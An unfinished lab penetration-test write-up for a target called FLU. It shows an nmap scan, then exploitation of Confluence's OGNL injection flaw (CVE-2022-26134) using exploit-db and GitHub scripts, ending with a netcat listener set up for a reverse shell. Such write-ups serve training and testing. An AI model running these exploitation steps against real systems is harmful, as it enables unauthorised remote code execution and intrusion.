# Report - Flu
- Author: Henry Post
- Target: FLU
- Target IP: 192.168.54.41
- Date: 04/12/2026
# Executive Summary

tbd

# Recommendations

# Resources
- CVE-2022-26134
- https://github.com/nxtexploit/CVE-2022-26134
# Recon

We run `nmap -sS -sV FLU`.

```
???(kali?kali)-[~]
??$ nmap -sS -sV FLU
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 01:29 +0000
Nmap scan report for FLU (192.168.54.41)
Host is up (0.00051s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
8090/tcp open  http    Apache Tomcat (language: en)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.05 seconds
```

![](Pasted%20image%2020260412202929.png)

We notice `ssh:22` and `http:8090` is running.
# Non-root access

Visiting http://FLU:8090 shows us that the target serves Confluence.

     Powered by Atlassian Confluence 7.13.6

CVE-2022-26134 affects Confluence.

```sh
searchsploit confluence

# Confluence Server 7.12.4 - 'OGNL injection' Remote Code Execution (RCE) | java/webapps/50243.py

searchsploit -p 50243

cp /usr/share/exploitdb/exploits/java/webapps/50243.py ./

python 50243.py -u http://FLU:8090 -p "/pages/createpage-entervariables.action?SpaceKey=x"
```

This attack fails, so let's find another one.

https://github.com/nxtexploit/CVE-2022-26134

```sh
git clone https://github.com/nxtexploit/CVE-2022-26134

cd CVE-2022-26134
python CVE-2022-26134.py http://FLU:8090 "pwd"
```

![](Pasted%20image%2020260412204626.png)

We can run simple commands. Let's try for a reverse shell.

```sh
# on attacker
ip a | grep 192 #192.168.49.54 = attacker ip
nc -nvlp 4444

```
# Root access